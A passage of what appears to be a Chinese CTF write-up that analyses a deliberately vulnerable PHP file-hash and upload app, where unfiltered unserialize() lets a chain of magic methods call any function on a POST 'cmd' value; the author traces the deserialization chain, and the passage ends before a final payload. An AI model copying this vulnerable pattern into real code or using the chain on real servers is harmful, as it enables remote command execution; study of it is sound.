+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">ApplicationContext</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$contextName</span><span class="p">;</span> 
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">contextName</span> <span class="o">=</span> <span class="s1">&#39;ApplicationContext&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__destruct</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">contextName</span> <span class="o">=</span> <span class="nx">strtolower</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">contextName</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">ContentProcessor</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">private</span> <span class="nv">$processedContent</span><span class="p">;</span> 
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$callbackFunction</span><span class="p">;</span>   
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">processedContent</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">FunctionInvoker</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__get</span><span class="p">(</span><span class="nv">$key</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nx">property_exists</span><span class="p">(</span><span class="nv">$this</span><span class="p">,</span> <span class="nv">$key</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="nx">is_object</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="nv">$key</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nx">is_string</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">callbackFunction</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                
+</span></span><span class="line"><span class="cl">                <span class="nv">$this</span><span class="o">-&gt;</span><span class="nv">$key</span><span class="o">-&gt;</span><span class="p">{</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">callbackFunction</span><span class="p">}(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;cmd&#39;</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">FileManager</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$targetFile</span><span class="p">;</span> 
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$responseData</span> <span class="o">=</span> <span class="s1">&#39;default_response&#39;</span><span class="p">;</span> 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$targetFile</span> <span class="o">=</span> <span class="k">null</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">targetFile</span> <span class="o">=</span> <span class="nv">$targetFile</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="nf">filterPath</span><span class="p">(){</span> 
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/^\/|php:|data|zip|\.\.\//i&#39;</span><span class="p">,</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">targetFile</span><span class="p">)){</span>
+</span></span><span class="line"><span class="cl">            <span class="k">die</span><span class="p">(</span><span class="s1">&#39;文件路径不符合规范&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="nf">performWriteOperation</span><span class="p">(</span><span class="nv">$var</span><span class="p">){</span> 
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">        <span class="nv">$targetObject</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">targetFile</span><span class="p">;</span> 
+</span></span><span class="line"><span class="cl">        <span class="nv">$value</span> <span class="o">=</span> <span class="nv">$targetObject</span><span class="o">-&gt;</span><span class="nv">$var</span><span class="p">;</span> 
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="nf">getFileHash</span><span class="p">(){</span> 
+</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">filterPath</span><span class="p">();</span> 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nx">is_string</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">targetFile</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="nx">file_exists</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">targetFile</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="nv">$md5_hash</span> <span class="o">=</span> <span class="nx">md5_file</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">targetFile</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="s2">&#34;文件MD5哈希: &#34;</span> <span class="o">.</span> <span class="nx">htmlspecialchars</span><span class="p">(</span><span class="nv">$md5_hash</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="k">die</span><span class="p">(</span><span class="s2">&#34;文件未找到&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="nx">is_object</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">targetFile</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">try</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                
+</span></span><span class="line"><span class="cl">                <span class="nv">$md5_hash</span> <span class="o">=</span> <span class="nx">md5_file</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">targetFile</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="s2">&#34;文件MD5哈希 (尝试): &#34;</span> <span class="o">.</span> <span class="nx">htmlspecialchars</span><span class="p">(</span><span class="nv">$md5_hash</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">TypeError</span> <span class="nv">$e</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                
+</span></span><span class="line"><span class="cl">                
+</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="s2">&#34;无法计算MD5哈希，因为文件参数无效: &#34;</span> <span class="o">.</span> <span class="nx">htmlspecialchars</span><span class="p">(</span><span class="nv">$e</span><span class="o">-&gt;</span><span class="na">getMessage</span><span class="p">());</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">die</span><span class="p">(</span><span class="s2">&#34;文件未找到&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__toString</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;method&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nx">method_exists</span><span class="p">(</span><span class="nv">$this</span><span class="p">,</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;method&#39;</span><span class="p">]))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$method</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;method&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$var</span> <span class="o">=</span> <span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;var&#39;</span><span class="p">])</span> <span class="o">?</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;var&#39;</span><span class="p">]</span> <span class="o">:</span> <span class="k">null</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$this</span><span class="o">-&gt;</span><span class="nv">$method</span><span class="p">(</span><span class="nv">$var</span><span class="p">);</span> 
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">responseData</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">FunctionInvoker</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$functionName</span><span class="p">;</span> 
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$functionArguments</span><span class="p">;</span> 
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__call</span><span class="p">(</span><span class="nv">$name</span><span class="p">,</span> <span class="nv">$arg</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nx">function_exists</span><span class="p">(</span><span class="nv">$name</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$name</span><span class="p">(</span><span class="nv">$arg</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span> 
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">$action</span> <span class="o">=</span> <span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;action&#39;</span><span class="p">])</span> <span class="o">?</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;action&#39;</span><span class="p">]</span> <span class="o">:</span> <span class="s1">&#39;home&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$output</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span> 
+</span></span><span class="line"><span class="cl"><span class="nv">$upload_dir</span> <span class="o">=</span> <span class="s2">&#34;upload/&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">is_dir</span><span class="p">(</span><span class="nv">$upload_dir</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">mkdir</span><span class="p">(</span><span class="nv">$upload_dir</span><span class="p">,</span> <span class="mo">0777</span><span class="p">,</span> <span class="k">true</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nv">$action</span> <span class="o">===</span> <span class="s1">&#39;upload_file&#39;</span><span class="p">)</span> <span class="p">{</span> 
+</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;submit&#39;</span><span class="p">])){</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;upload_file&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;upload_file&#39;</span><span class="p">][</span><span class="s1">&#39;error&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="nx">UPLOAD_ERR_OK</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$allowed_extensions</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;txt&#39;</span><span class="p">,</span> <span class="s1">&#39;png&#39;</span><span class="p">,</span> <span class="s1">&#39;gif&#39;</span><span class="p">,</span> <span class="s1">&#39;jpg&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$file_info</span> <span class="o">=</span> <span class="nx">pathinfo</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;upload_file&#39;</span><span class="p">][</span><span class="s1">&#39;name&#39;</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$file_extension</span> <span class="o">=</span> <span class="nx">strtolower</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$file_info</span><span class="p">[</span><span class="s1">&#39;extension&#39;</span><span class="p">])</span> <span class="o">?</span> <span class="nv">$file_info</span><span class="p">[</span><span class="s1">&#39;extension&#39;</span><span class="p">]</span> <span class="o">:</span> <span class="s1">&#39;&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">in_array</span><span class="p">(</span><span class="nv">$file_extension</span><span class="p">,</span> <span class="nv">$allowed_extensions</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="nv">$output</span> <span class="o">=</span> <span class="s2">&#34;&lt;p class=&#39;text-red-600&#39;&gt;不允许的文件类型。只允许 txt, png, gif, jpg。&lt;/p&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                
+</span></span><span class="line"><span class="cl">                <span class="nv">$unique_filename</span> <span class="o">=</span> <span class="nx">md5</span><span class="p">(</span><span class="nx">time</span><span class="p">()</span> <span class="o">.</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;upload_file&#39;</span><span class="p">][</span><span class="s1">&#39;name&#39;</span><span class="p">])</span> <span class="o">.</span> <span class="s1">&#39;.&#39;</span> <span class="o">.</span> <span class="nv">$file_extension</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">                <span class="nv">$upload_path</span> <span class="o">=</span> <span class="nv">$upload_dir</span> <span class="o">.</span> <span class="nv">$unique_filename</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">                <span class="nv">$temp_file</span> <span class="o">=</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;upload_file&#39;</span><span class="p">][</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="p">(</span><span class="nx">move_uploaded_file</span><span class="p">(</span><span class="nv">$temp_file</span><span class="p">,</span> <span class="nv">$upload_path</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                    <span class="nv">$output</span> <span class="o">=</span> <span class="s2">&#34;&lt;p class=&#39;text-green-600&#39;&gt;文件上传成功！&lt;/p&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">                    <span class="nv">$output</span> <span class="o">.=</span> <span class="s2">&#34;&lt;p class=&#39;text-gray-700&#39;&gt;文件路径：&lt;code class=&#39;bg-gray-200 p-1 rounded&#39;&gt;&#34;</span> <span class="o">.</span> <span class="nx">htmlspecialchars</span><span class="p">(</span><span class="nv">$upload_path</span><span class="p">)</span> <span class="o">.</span> <span class="s2">&#34;&lt;/code&gt;&lt;/p&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">                <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                    <span class="nv">$output</span> <span class="o">=</span> <span class="s2">&#34;&lt;p class=&#39;text-red-600&#39;&gt;上传失败！&lt;/p&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">                <span class="p">}</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$output</span> <span class="o">=</span> <span class="s2">&#34;&lt;p class=&#39;text-red-600&#39;&gt;请选择一个文件上传。&lt;/p&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nv">$action</span> <span class="o">===</span> <span class="s1">&#39;home&#39;</span> <span class="o">&amp;&amp;</span> <span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;submit_md5&#39;</span><span class="p">]))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$filename_param</span> <span class="o">=</span> <span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;file_to_check&#39;</span><span class="p">])</span> <span class="o">?</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;file_to_check&#39;</span><span class="p">]</span> <span class="o">:</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$filename_param</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$file_object</span> <span class="o">=</span> <span class="o">@</span><span class="nx">unserialize</span><span class="p">(</span><span class="nv">$filename_param</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nv">$file_object</span> <span class="o">===</span> <span class="k">false</span> <span class="o">||</span> <span class="o">!</span><span class="p">(</span><span class="nv">$file_object</span> <span class="nx">instanceof</span> <span class="nx">FileManager</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$file_object</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">FileManager</span><span class="p">(</span><span class="nv">$filename_param</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$output</span> <span class="o">=</span> <span class="nv">$file_object</span><span class="o">-&gt;</span><span class="na">getFileHash</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$output</span> <span class="o">=</span> <span class="s2">&#34;&lt;p class=&#39;text-gray-600&#39;&gt;请输入文件路径进行MD5校验。&lt;/p&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div><div class="code-expand-btn" aria-label="Expand or collapse code block" role="button"><i class="fa-solid fa-angles-down" aria-hidden="true"></i></div></div><p>初看以为是 <code>phar</code>，提供的功能十分像，发现 md5 这块最上面定义了一个 <code>$file_object = @unserialize($filename_param);</code>直接反序列化且没有过滤，于是就在找反序列化链子，没去尝试 <code>phar</code>（也许也能打）
+<code>ApplicationContext::__destruct()</code>反序列化进去 strtolower 预取接收 str，将 contextName 赋值为 FileManager 实例化对象，走到 <code>__toString()</code></p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="2" style="--fi-max-shown-lines:30;--fi-line-digit:2;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">ApplicationContext</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">public</span> <span class="err">$</span><span class="n">contextName</span><span class="p">;</span> 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">public</span> <span class="n">function</span> <span class="n">__construct</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl">        <span class="err">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">contextName</span> <span class="o">=</span> <span class="s1">&#39;ApplicationContext&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">public</span> <span class="n">function</span> <span class="n">__destruct</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl">        <span class="err">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">contextName</span> <span class="o">=</span> <span class="n">strtolower</span><span class="p">(</span><span class="err">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">contextName</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">FileManager</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">public</span> <span class="err">$</span><span class="n">targetFile</span><span class="p">;</span> 
+</span></span><span class="line"><span class="cl">    <span class="n">public</span> <span class="err">$</span><span class="n">responseData</span> <span class="o">=</span> <span class="s1">&#39;default_response&#39;</span><span class="p">;</span> 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="n">public</span> <span class="n">function</span> <span class="n">performWriteOperation</span><span class="p">(</span><span class="err">$</span><span class="n">var</span><span class="p">){</span> 
+</span></span><span class="line"><span class="cl">        <span class="err">$</span><span class="n">targetObject</span> <span class="o">=</span> <span class="err">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">targetFile</span><span class="p">;</span> 
+</span></span><span class="line"><span class="cl">        <span class="err">$</span><span class="n">value</span> <span class="o">=</span> <span class="err">$</span><span class="n">targetObject</span><span class="o">-&gt;</span><span class="err">$</span><span class="n">var</span><span class="p">;</span> 
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="n">public</span> <span class="n">function</span> <span class="n">__toString</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">isset</span><span class="p">(</span><span class="err">$</span><span class="n">_POST</span><span class="p">[</span><span class="s1">&#39;method&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="n">method_exists</span><span class="p">(</span><span class="err">$</span><span class="n">this</span><span class="p">,</span> <span class="err">$</span><span class="n">_POST</span><span class="p">[</span><span class="s1">&#39;method&#39;</span><span class="p">]))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="err">$</span><span class="n">method</span> <span class="o">=</span> <span class="err">$</span><span class="n">_POST</span><span class="p">[</span><span class="s1">&#39;method&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">            <span class="err">$</span><span class="n">var</span> <span class="o">=</span> <span class="n">isset</span><span class="p">(</span><span class="err">$</span><span class="n">_POST</span><span class="p">[</span><span class="s1">&#39;var&#39;</span><span class="p">])</span> <span class="err">?</span> <span class="err">$</span><span class="n">_POST</span><span class="p">[</span><span class="s1">&#39;var&#39;</span><span class="p">]</span> <span class="p">:</span> <span class="n">null</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="err">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="err">$</span><span class="n">method</span><span class="p">(</span><span class="err">$</span><span class="n">var</span><span class="p">);</span> 
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="err">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">responseData</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p>然后跳转本类 <code>$method =  performWriteOperation</code> 方法，<code>$targetObject</code>赋值 ContentProces 实例化对象，<code>$var</code> 赋值为<code>processedContent</code>属性，这是一个私有属性，触发 <code>__get()</code></p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="2" style="--fi-max-shown-lines:30;--fi-line-digit:2;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">ContentProcessor</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">private</span> <span class="err">$</span><span class="n">processedContent</span><span class="p">;</span> 
+</span></span><span class="line"><span class="cl">    <span class="n">public</span> <span class="err">$</span><span class="n">callbackFunction</span><span class="p">;</span>   
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">public</span> <span class="n">function</span> <span class="n">__construct</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">        <span class="err">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">processedContent</span> <span class="o">=</span> <span class="n">new</span> <span class="n">FunctionInvoker</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">public</span> <span class="n">function</span> <span class="n">__get</span><span class="p">(</span><span class="err">$</span><span class="n">key</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">property_exists</span><span class="p">(</span><span class="err">$</span><span class="n">this</span><span class="p">,</span> <span class="err">$</span><span class="n">key</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="n">is_object</span><span class="p">(</span><span class="err">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="err">$</span><span class="n">key</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="n">is_string</span><span class="p">(</span><span class="err">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">callbackFunction</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                
+</span></span><span class="line"><span class="cl">                <span class="err">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="err">$</span><span class="n">key</span><span class="o">-&gt;</span><span class="p">{</span><span class="err">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">callbackFunction</span><span class="p">}(</span><span class="err">$</span><span class="n">_POST</span><span class="p">[</span><span class="s1">&#39;cmd&#39;</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
